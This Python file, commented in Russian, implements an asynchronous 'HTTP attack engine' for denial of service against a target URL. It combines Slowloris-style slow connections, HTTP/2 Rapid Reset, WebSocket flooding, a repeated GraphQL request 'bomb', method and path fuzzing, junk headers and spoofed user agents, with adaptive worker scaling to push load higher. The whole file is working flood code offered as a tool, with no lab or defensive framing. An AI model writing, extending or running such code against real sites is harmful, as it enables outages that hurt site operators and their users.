# attack.py 
import asyncio
import websockets
import httpx
import random
import time
from urllib.parse import urlparse
from typing import List, Dict, Optional, Set, Tuple
import logging
from contextlib import AsyncExitStack, asynccontextmanager
import signal

from utils import generate_headers, DataPool, random_string
from colorama import Fore, Style
from core.rate_limiter import RateLimiter, BurstRateLimiter, AdaptiveRateLimiter

logger = logging.getLogger(__name__)


class ConnectionPool:
    """Безопасный пул соединений с автоматической очисткой."""
    
    def __init__(self, max_size: int = 1000):
        self._pool: List[httpx.AsyncClient] = []
        self._max_size = max_size
        self._lock = asyncio.Lock()
        self._closed = False
        
    async def acquire(self, factory) -> httpx.AsyncClient:
        """Получить соединение из пула или создать новое."""
        if self._closed:
            raise RuntimeError("Connection pool is closed")
            
        async with self._lock:
            if self._pool:
                return self._pool.pop()
            
        client = await factory()
        return client
    
    async def release(self, client: httpx.AsyncClient):
        """Вернуть соединение в пул или закрыть если пул полон."""
        if self._closed:
            await client.aclose()
            return
            
        async with self._lock:
            if len(self._pool) < self._max_size:
                self._pool.append(client)
            else:
                await client.aclose()
    
    async def close_all(self):
        """Закрыть все соединения в пуле."""
        self._closed = True
        async with self._lock:
            for client in self._pool:
                try:
                    await asyncio.wait_for(client.aclose(), timeout=1.0)
                except Exception:
                    pass
            self._pool.clear()


class SlowRequestManager:
    """Управление медленными HTTP-соединениями с контролем ресурсов."""
    
    def __init__(self, host: str, headers_generator, useragents: list, referers: list,
                 junk: bool, random_host: bool, header_flood: bool, max_connections: int = 1000):
        self.host = host
        self.headers_generator = headers_generator
        self.useragents = useragents
        self.referers = referers
        self.junk = junk
        self.random_host = random_host
        self.header_flood = header_flood
        self.max_connections = max_connections
        
        self._connections: Dict[asyncio.StreamWriter, asyncio.Task] = {}
        self._lock = asyncio.Lock()
        self._closed = False
        
    async def start_slow_request(self, url: str, shutdown_event: asyncio.Event) -> Optional[asyncio.Task]:
        """Инициирует медленное соединение с контролем лимитов."""
        if shutdown_event.is_set() or self._closed:
            return None
            
        async with self._lock:
            if len(self._connections) >= self.max_connections:
                return None
                
            task = asyncio.create_task(self._slow_connection_worker(url, shutdown_event))
            self._connections[id(task)] = task
            task.add_done_callback(lambda t: asyncio.create_task(self._cleanup_task(t)))
            return task
    
    async def _slow_connection_worker(self, url: str, shutdown_event: asyncio.Event):
        """Воркер для одного медленного соединения."""
        writer = None
        try:
            target = self.host
            port = 443 if url.startswith('https') else 80
            ssl = url.startswith('https')
            
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port, ssl=ssl),
                timeout=5.0
            )
            
            # Отправляем начальную строку
            writer.write(f"GET {url} HTTP/1.1\r\nHost: {self.host}\r\n".encode())
            await asyncio.wait_for(writer.drain(), timeout=2.0)
            
            # Генерируем и отправляем заголовки с задержками
            headers = self.headers_generator(
                self.host, self.useragents, self.referers,
                use_junk=self.junk, use_random_host=self.random_host,
                header_flood=self.header_flood
            )
            
            for k, v in headers.items():
                if shutdown_event.is_set():
                    break
                    
                writer.write(f"{k}: {v}\r\n".encode())
                try:
                    await asyncio.wait_for(writer.drain(), timeout=1.0)
                except asyncio.TimeoutError:
                    break
                    
                await asyncio.sleep(0.1 + random.uniform(0.0, 0.3))
            
            # Держим соединение открытым
            while not shutdown_event.is_set():
                await asyncio.sleep(1.0)
                # Отправляем keep-alive заголовки
                try:
                    writer.write(f"X-KeepAlive: {random.randint(1000, 9999)}\r\n".encode())
                    await asyncio.wait_for(writer.drain(), timeout=1.0)
                except Exception:
                    break
                    
        except asyncio.TimeoutError:
            logger.debug("Slow connection timeout")
        except Exception as e:
            logger.debug(f"Slow request error: {e}")
        finally:
            if writer:
                try:
                    writer.close()
                    await asyncio.wait_for(writer.wait_closed(), timeout=2.0)
                except Exception:
                    pass
    
    async def _cleanup_task(self, task: asyncio.Task):
        """Очистка завершенной задачи."""
        async with self._lock:
            self._connections.pop(id(task), None)
    
    async def close_all(self):
        """Закрыть все медленные соединения."""
        self._closed = True
        async with self._lock:
            tasks = list(self._connections.values())
            self._connections.clear()
        
        for task in tasks:
            task.cancel()
        
        if tasks:
            await asyncio.wait(tasks, timeout=3.0)


class AdaptiveController:
    """Адаптивный контроллер с обратной связью."""
    
    def __init__(self, initial_workers: int, min_workers: int = 1, max_workers: int = 10000,
                 target_rps: int = 0, step_factor: float = 0.1):
        self.workers = initial_workers
        self.min_workers = min_workers
        self.max_workers = max_workers
        self.target_rps = target_rps
        self.step_factor = step_factor
        
        self.history: List[Tuple[float, float, float]] = []  # (timestamp, rps, error_rate)
        self._lock = asyncio.Lock()
        
    async def update(self, current_rps: float, error_rate: float) -> int:
        """Обновить количество воркеров на основе метрик."""
        async with self._lock:
            now = time.time()
            self.history.append((now, current_rps, error_rate))
            
            # Оставляем только последние 60 секунд
            self.history = [(t, r, e) for t, r, e in self.history if now - t < 60]
            
            # Анализ тренда
            if len(self.history) < 5:
                return self.workers
            
            # Вычисляем скользящее среднее
            avg_rps = sum(r for _, r, _ in self.history[-5:]) / 5
            avg_error = sum(e for _, _, e in self.history[-5:]) / 5
            
            # Правила адаптации
            if avg_error > 0.3:
                # Слишком много ошибок - уменьшаем нагрузку
                self.workers = max(self.min_workers, int(self.workers * (1 - self.step_factor * 2)))
            elif avg_error > 0.1:
                # Умеренные ошибки - легкое снижение
                self.workers = max(self.min_workers, int(self.workers * (1 - self.step_factor)))
            elif self.target_rps > 0 and avg_rps < self.target_rps * 0.8:
                # Недогруз - увеличиваем
                self.workers = min(self.max_workers, int(self.workers * (1 + self.step_factor)))
            elif avg_error < 0.01 and avg_rps > 0:
                # Стабильно - пробуем увеличить
                self.workers = min(self.max_workers, int(self.workers * (1 + self.step_factor * 0.5)))
            
            logger.info(f"Adaptive: workers={self.workers}, rps={avg_rps:.1f}, error={avg_error:.2%}")
            return self.workers


class HttpAttackEngine:
    """Production-ready HTTP attack engine."""
    
    def __init__(self, url: str, workers: int, sockets: int, methods: List[str],
                 useragents: List[str], no_ssl_check: bool, debug: bool, proxy: str = None,
                 use_http2: bool = False, use_http3: bool = False, websocket: bool = False,
                 auth: str = None, h2reset: bool = False, graphql_bomb: bool = False,
                 adaptive: bool = False, slow_rate: float = 0.0,
                 extreme: bool = False, data_size: int = 0, flood: bool = False, path_fuzz: bool = False,
                 header_flood: bool = False, method_fuzz: bool = False,
                 junk: bool = False, random_host: bool = False,
                 max_rps: int = 0, max_bandwidth: float = 0,
                 slow_connections: int = 1000):
        
        self.url = url
        self.workers = workers
        self.sockets = sockets
        self.methods = methods
        self.useragents = useragents or self._default_useragents()
        self.no_ssl_check = no_ssl_check
        self.debug = debug
        self.proxy = proxy
        self.use_http2 = use_http2
        self.use_http3 = use_http3
        self.websocket = websocket
        self.auth = auth
        self.h2reset = h2reset
        self.graphql_bomb = graphql_bomb
        self.adaptive = adaptive
        self.slow_rate = slow_rate
        self.extreme = extreme
        self.data_size = data_size
        self.flood = flood
        self.path_fuzz = path_fuzz
        self.header_flood = header_flood
        self.method_fuzz = method_fuzz
        self.junk = junk
        self.random_host = random_host
        self.max_rps = max_rps
        self.max_bandwidth = max_bandwidth
        self.slow_connections = slow_connections

        self.parsed_url = urlparse(url)
        self.host = self.parsed_url.netloc
        self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"
        
        # Константы
        self.REFERERS = [
            'http://google.com/', 'http://bing.com/', 'http://yahoo.com/',
            'http://duckduckgo.com/', 'http://facebook.com/', 'http://twitter.com/',
            f'http://{self.host}/'
        ]
        self.PATHS = [
            '/', '/news', '/home', '/about', '/contact', '/blog', '/products',
            '/product', '/category', '/admin', '/login', '/register', '/cart',
            '/checkout', '/search', '/api', '/v1', '/v2', '/static', '/assets'
        ]
        self.FUZZ_METHODS = ['PROPFIND', 'REPORT', 'MKCOL', 'LOCK', 'UNLOCK', 'TRACE']
        self.BODY_METHODS = {'POST', 'PUT', 'PATCH', 'PROPFIND', 'REPORT', 'MKCOL', 'LOCK'}
        
        # Компоненты
        self.rate_limiter = None
        if max_rps > 0 or max_bandwidth > 0:
            if adaptive:
                # Adaptive режим использует AdaptiveRateLimiter
                self.rate_limiter = AdaptiveRateLimiter(max_rps, max_bandwidth)
                logger.info(f"Adaptive rate limiter enabled: max_rps={max_rps}, max_bandwidth={max_bandwidth} Mbps")
            else:
                # Обычный режим использует BurstRateLimiter для лучшей производительности
                self.rate_limiter = BurstRateLimiter(max_rps, max_bandwidth)
                logger.info(f"Burst rate limiter enabled: max_rps={max_rps}, max_bandwidth={max_bandwidth} Mbps")
        
        self.adaptive_controller = AdaptiveController(workers) if adaptive else None
        
        # Статистика
        self.sent = 0
        self.failed = 0
        self.skipped = 0
        self.start_time = time.time()
        self._stats_lock = asyncio.Lock()
        self.rps_history = []
        self.latency_samples = []
        
        # Управление ресурсами
        self._shutdown_event = asyncio.Event()
        self._main_tasks: Set[asyncio.Task] = set()
        self._connection_pools: Dict[int, ConnectionPool] = {}
        self._slow_manager: Optional[SlowRequestManager] = None
        self._exit_stack = AsyncExitStack()
        self._sigint_received = False
        
        # Data pool для тела запроса
        self._data_pool = None
        if data_size > 0:
            self._data_pool = DataPool(data_size, pool_size=100)
        
    @staticmethod
    def _default_useragents() -> List[str]:
        """Список User-Agent по умолчанию."""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        ]
    
    async def __aenter__(self):
        """Вход в context manager."""
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Выход из context manager с гарантированной очисткой."""
        await self.shutdown()
    
    async def start(self):
        """Запуск атаки с правильной обработкой сигналов."""
        # Установка обработчиков сигналов
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                loop.add_signal_handler(sig, lambda: asyncio.create_task(self._handle_signal()))
            except NotImplementedError:
                pass
        
        try:
            if self.websocket:
                await self.websocket_flood()
            elif self.graphql_bomb:
                await self.send_graphql_bomb()
            else:
                await self._run_workers()
        except asyncio.CancelledError:
            logger.info("Attack cancelled")
        finally:
            await self.shutdown()
    
    async def _handle_signal(self):
        """Обработка сигналов остановки."""
        if not self._sigint_received:
            self._sigint_received = True
            logger.info("Received stop signal, shutting down...")
            await self.shutdown()
    
    async def _create_client_factory(self, worker_id: int):
        """Фабрика создания HTTP клиентов с правильной конфигурацией."""
        async def _factory():
            limits = httpx.Limits(
                max_connections=1000,
                max_keepalive_connections=20 if not self.extreme else 0,
                keepalive_expiry=5.0 if not self.extreme else 0.1
            )
            
            timeout = httpx.Timeout(
                connect=5.0,
                read=10.0,
                write=5.0,
                pool=1.0
            )
            
            client_args = {
                "verify": not self.no_ssl_check,
                "timeout": timeout,
                "limits": limits,
                "follow_redirects": False,
            }
            
            if self.use_http2:
                client_args["http2"] = True
            
            if self.use_http3:
                try:
                    client_args["http3"] = True
                except Exception as e:
                    logger.warning(f"HTTP/3 not available: {e}")
            
            if self.proxy and not (self.use_http2 or self.use_http3):
                client_args["proxies"] = {"all://": self.proxy}
            
            client = httpx.AsyncClient(**client_args)
            await client.__aenter__()
            return client
        
        return _factory
    
    async def _get_connection_pool(self, worker_id: int) -> ConnectionPool:
        """Получить или создать пул соединений для воркера."""
        if worker_id not in self._connection_pools:
            self._connection_pools[worker_id] = ConnectionPool(max_size=self.sockets * 2)
        return self._connection_pools[worker_id]
    
    async def _worker(self, worker_id: int):
        """Один воркер с безопасным управлением соединениями."""
        pool = await self._get_connection_pool(worker_id)
        factory = await self._create_client_factory(worker_id)
        
        # Инициализация пула
        clients = []
        try:
            for _ in range(self.sockets):
                client = await factory()
                clients.append(client)
                await pool.release(client)  # Возвращаем в пул
            
            while not self._shutdown_event.is_set():
                client = await pool.acquire(factory)
                
                try:
                    method = self._get_random_method()
                    url = self._build_random_url()
                    headers = generate_headers(
                        self.host, self.useragents, self.REFERERS,
                        use_junk=self.junk, use_random_host=self.random_host,
                        header_flood=self.header_flood, auth_token=self.auth
                    )
                    
                    # Подготовка данных
                    data = None
                    if method in self.BODY_METHODS and self.data_size > 0:
                        data = self._prepare_body(method)
                    
                    # Оценка размера для rate limiter
                    request_size = self._estimate_request_size(method, url, headers, data)
                    
                    # Проверка лимитов
                    if self.rate_limiter and not await self.rate_limiter.acquire(request_size):
                        async with self._stats_lock:
                            self.skipped += 1
                        if not self.flood:
                            await asyncio.sleep(0.001)
                        continue
                    
                    # Отправка запроса
                    await self._send_request(client, method, url, headers, data)
                    
                    # HTTP/2 Rapid Reset
                    if self.h2reset:
                        await client.aclose()
                        client = await factory()
                    
                    # Медленные соединения
                    if random.random() < self.slow_rate and self._slow_manager:
                        await self._slow_manager.start_slow_request(url, self._shutdown_event)
                    
                finally:
                    await pool.release(client)
                
                # Адаптивная задержка
                if not self.flood:
                    await asyncio.sleep(random.uniform(0.005, 0.05))
                else:
                    await asyncio.sleep(0)
                    
        except asyncio.CancelledError:
            logger.debug(f"Worker {worker_id} cancelled")
        except Exception as e:
            logger.error(f"Worker {worker_id} error: {e}", exc_info=self.debug)
        finally:
            # Закрываем все клиенты воркера
            for client in clients:
                try:
                    await client.aclose()
                except Exception:
                    pass
    
    def _prepare_body(self, method: str) -> str:
        """Подготовка тела запроса."""
        if method in {'PROPFIND', 'REPORT', 'LOCK', 'MKCOL'}:
            # WebDAV XML
            xml_template = '<?xml version="1.0"?><propfind xmlns="DAV:"><allprop/></propfind>'
            if self.data_size > len(xml_template):
                xml_template += 'X' * (self.data_size - len(xml_template))
            return xml_template
        else:
            # Случайные данные
            if self._data_pool:
                return self._data_pool.get_random()
            return 'X' * self.data_size
    
    def _estimate_request_size(self, method: str, url: str, headers: dict, data: str = None) -> int:
        """Оценка размера запроса для rate limiter."""
        size = len(method) + len(url) + 20  # HTTP version + headers
        for k, v in headers.items():
            size += len(k) + len(v) + 4  # ": " + "\r\n"
        if data:
            size += len(data)
        return size
    
    def _build_random_url(self) -> str:
        """Генерация случайного URL."""
        path = random.choice(self.PATHS)
        
        if self.path_fuzz and random.random() < 0.3:
            depth = random.randint(2, 5)
            path += "/" + "/".join(random_string(6) for _ in range(depth))
        
        query = f"?t={random.randint(1000, 9999)}&r={random_string(4)}"
        full = self.base_url + path + query
        
        # Ограничение длины URL
        if len(full) > 2048:
            path = path[:2048 - len(self.base_url) - len(query) - 10]
            full = self.base_url + path + query
        
        return full
    
    def _get_random_method(self) -> str:
        """Выбор случайного HTTP метода."""
        if self.method_fuzz and random.random() < 0.2:
            return random.choice(self.FUZZ_METHODS)
        return random.choice(self.methods)
    
    async def _send_request(self, client, method, url, headers, data):
        """Отправка запроса с измерением времени."""
        start = time.time()
        try:
            response = await client.request(
                method, url, 
                headers=headers, 
                content=data,
                follow_redirects=False
            )
            latency_ms = (time.time() - start) * 1000
            
            async with self._stats_lock:
                self.sent += 1
                self.latency_samples.append(latency_ms)
                if len(self.latency_samples) > 1000:
                    self.latency_samples = self.latency_samples[-1000:]
            
            # Адаптивное обновление
            await self._update_adaptive_metrics()
                
        except Exception as e:
            async with self._stats_lock:
                self.failed += 1
            if self.debug:
                logger.debug(f"Request failed: {e}")
    
    async def _update_adaptive_metrics(self):
        """Обновление адаптивных метрик."""
        async with self._stats_lock:
            elapsed = time.time() - self.start_time
            if elapsed < 5:  # Ждём накопления статистики
                return
            
            current_rps = self.sent / elapsed
            error_rate = self.failed / (self.sent + self.failed + 1)
            
            # Передаём метрики в адаптивный rate limiter
            if isinstance(self.rate_limiter, AdaptiveRateLimiter) and self.latency_samples:
                avg_latency = sum(self.latency_samples[-10:]) / min(10, len(self.latency_samples))
                self.rate_limiter.record_latency(avg_latency)
            
            # Обновляем количество воркеров если используется adaptive_controller
            if self.adaptive_controller:
                new_workers = await self.adaptive_controller.update(current_rps, error_rate)
                if new_workers != self.workers:
                    logger.info(f"Adaptive: adjusting workers from {self.workers} to {new_workers}")
                    self.workers = new_workers
    
    async def _run_workers(self):
        """Запуск пула воркеров с контролем."""
        logger.info(f"Starting attack with {self.workers} workers, {self.sockets} sockets each")
        
        # Инициализация менеджера медленных соединений
        if self.slow_rate > 0:
            self._slow_manager = SlowRequestManager(
                self.host, generate_headers, self.useragents, self.REFERERS,
                self.junk, self.random_host, self.header_flood,
                max_connections=self.slow_connections
            )
            logger.info(f"Slow request manager initialized with {self.slow_connections} max connections")
        
        # Запуск воркеров
        for i in range(self.workers):
            task = asyncio.create_task(self._worker(i), name=f"worker-{i}")
            self._main_tasks.add(task)
            task.add_done_callback(self._main_tasks.discard)
        
        # Запуск мониторинга
        monitor_task = asyncio.create_task(self._monitor(), name="monitor")
        self._main_tasks.add(monitor_task)
        monitor_task.add_done_callback(self._main_tasks.discard)
        
        # Запуск сбора статистики
        stats_task = asyncio.create_task(self._collect_stats(), name="stats")
        self._main_tasks.add(stats_task)
        stats_task.add_done_callback(self._main_tasks.discard)
        
        # Запуск адаптивного rate limiter если нужно
        if isinstance(self.rate_limiter, AdaptiveRateLimiter):
            await self.rate_limiter.start_adaptive_adjustment()
        
        # Ожидание завершения
        try:
            await asyncio.gather(*self._main_tasks, return_exceptions=True)
        except asyncio.CancelledError:
            logger.info("Worker pool cancelled")
    
    async def _monitor(self):
        """Мониторинг и вывод статистики."""
        last_sent = 0
        last_time = time.time()
        
        try:
            while not self._shutdown_event.is_set():
                await asyncio.sleep(0.5)
                
                now = time.time()
                elapsed = now - last_time
                
                async with self._stats_lock:
                    current_sent = self.sent
                    current_failed = self.failed
                    current_skipped = self.skipped
                
                if elapsed > 0:
                    rps = int((current_sent - last_sent) / elapsed)
                    
                    # Статистика rate limiter
                    limiter_info = ""
                    if self.rate_limiter:
                        stats = self.rate_limiter.get_stats()
                        if stats['limited'] > 0:
                            limiter_info = f" | 🚦 Limited: {stats['limited']}"
                    
                    # Статистика latency
                    lat_info = ""
                    if self.latency_samples:
                        avg_lat = sum(self.latency_samples[-10:]) / min(10, len(self.latency_samples))
                        lat_info = f" | ⏱️ {avg_lat:.1f}ms"
                    
                    print(f"\r{Fore.WHITE}📬 Sent: {current_sent:,} | "
                          f"⚠️ Failed: {current_failed:,} | "
                          f"🚀 RPS: {rps:4d} | "
                          f"⏱️ Total: {int(now - self.start_time)}s"
                          f"{limiter_info}{lat_info}{Style.RESET_ALL}", end="")
                    
                    last_sent = current_sent
                    last_time = now
                    
        except asyncio.CancelledError:
            self._print_final_stats()
    
    async def _collect_stats(self):
        """Сбор статистики для графиков."""
        last_sent = 0
        try:
            while not self._shutdown_event.is_set():
                await asyncio.sleep(1.0)
                async with self._stats_lock:
                    now = int(time.time() - self.start_time)
                    rps = self.sent - last_sent
                    self.rps_history.append({'time': now, 'rps': rps})
                    if len(self.rps_history) > 3600:  # Максимум 1 час
                        self.rps_history = self.rps_history[-3600:]
                    last_sent = self.sent
        except asyncio.CancelledError:
            pass
    
    def _print_final_stats(self):
        """Вывод финальной статистики."""
        elapsed = time.time() - self.start_time
        if elapsed < 1:
            return
            
        avg_rps = self.sent / elapsed
        error_rate = (self.failed / (self.sent + self.failed + 1)) * 100
        
        print(f"\n\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✅ Attack completed{Style.RESET_ALL}")
        print(f"{Fore.CYAN}⏱️  Duration: {elapsed:.1f}s{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📊 Total requests: {self.sent:,}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}⚠️  Failed: {self.failed:,} ({error_rate:.1f}%){Style.RESET_ALL}")
        print(f"{Fore.CYAN}🚀 Average RPS: {avg_rps:.1f}{Style.RESET_ALL}")
        
        if self.rate_limiter:
            stats = self.rate_limiter.get_stats()
            print(f"{Fore.CYAN}🚦 Rate limited: {stats['limited']:,} ({stats['limited_percent']:.1f}%){Style.RESET_ALL}")
        
        if self.latency_samples:
            avg_lat = sum(self.latency_samples) / len(self.latency_samples)
            max_lat = max(self.latency_samples)
            print(f"{Fore.CYAN}⏱️  Avg latency: {avg_lat:.1f}ms (max: {max_lat:.1f}ms){Style.RESET_ALL}")
    
    async def websocket_flood(self):
        """WebSocket flood с контролем ресурсов."""
        logger.info(f"Starting WebSocket flood to {self.url}")
        ws_url = self.url.replace("http", "ws")
        
        tasks = []
        try:
            for i in range(min(self.workers * self.sockets, 1000)):  # Лимит на WebSocket
                task = asyncio.create_task(self._ws_worker(ws_url, i))
                tasks.append(task)
                self._main_tasks.add(task)
                task.add_done_callback(self._main_tasks.discard)
            
            await asyncio.gather(*tasks, return_exceptions=True)
        except Exception as e:
            logger.error(f"WebSocket flood error: {e}")
    
    async def _ws_worker(self, uri: str, worker_id: int):
        """Один WebSocket воркер."""
        while not self._shutdown_event.is_set():
            try:
                async with websockets.connect(
                    uri, 
                    ssl=(not self.no_ssl_check),
                    ping_interval=20,
                    ping_timeout=10,
                    close_timeout=5
                ) as ws:
                    while not self._shutdown_event.is_set():
                        data = random_string(random.randint(32, 256))
                        
                        # Проверка лимитов
                        if self.rate_limiter and not await self.rate_limiter.acquire(len(data)):
                            async with self._stats_lock:
                                self.skipped += 1
                            await asyncio.sleep(0.01)
                            continue
                        
                        await ws.send(data)
                        async with self._stats_lock:
                            self.sent += 1
                        
                        await asyncio.sleep(0.1 if not self.flood else 0)
                        
            except websockets.ConnectionClosed:
                logger.debug(f"WebSocket {worker_id} connection closed")
            except Exception as e:
                if self.debug:
                    logger.debug(f"WebSocket {worker_id} error: {e}")
            
            await asyncio.sleep(0.1)
    
    async def send_graphql_bomb(self):
        """GraphQL бомба с контролем."""
        logger.info("Starting GraphQL bomb")
        url = self.url.rstrip("/") + "/graphql"
        
        # Подготовка payload
        base_query = {"query": "query { __typename }"}
        query_size = len(str(base_query).encode())
        
        async with httpx.AsyncClient(timeout=30) as client:
            for i in range(1000):
                if self._shutdown_event.is_set():
                    break
                
                # Проверка лимитов
                if self.rate_limiter and not await self.rate_limiter.acquire(query_size):
                    async with self._stats_lock:
                        self.skipped += 1
                    await asyncio.sleep(0.001)
                    continue
                
                try:
                    await client.post(url, json=base_query)
                    async with self._stats_lock:
                        self.sent += 1
                except Exception:
                    async with self._stats_lock:
                        self.failed += 1
                
                await asyncio.sleep(0.001)
    
    async def shutdown(self):
        """Безопасное завершение всех компонентов."""
        if self._shutdown_event.is_set():
            return
        
        logger.info("Shutting down attack engine...")
        self._shutdown_event.set()
        
        # Остановка адаптивного rate limiter
        if isinstance(self.rate_limiter, AdaptiveRateLimiter):
            await self.rate_limiter.stop_adaptive_adjustment()
        
        # Отмена всех задач
        for task in self._main_tasks:
            task.cancel()
        
        if self._main_tasks:
            await asyncio.wait(self._main_tasks, timeout=5.0)
        
        # Закрытие менеджера медленных соединений
        if self._slow_manager:
            await self._slow_manager.close_all()
        
        # Закрытие всех пулов соединений
        for pool in self._connection_pools.values():
            await pool.close_all()
        
        # Вывод финальной статистики
        self._print_final_stats()
        
        logger.info("Shutdown complete")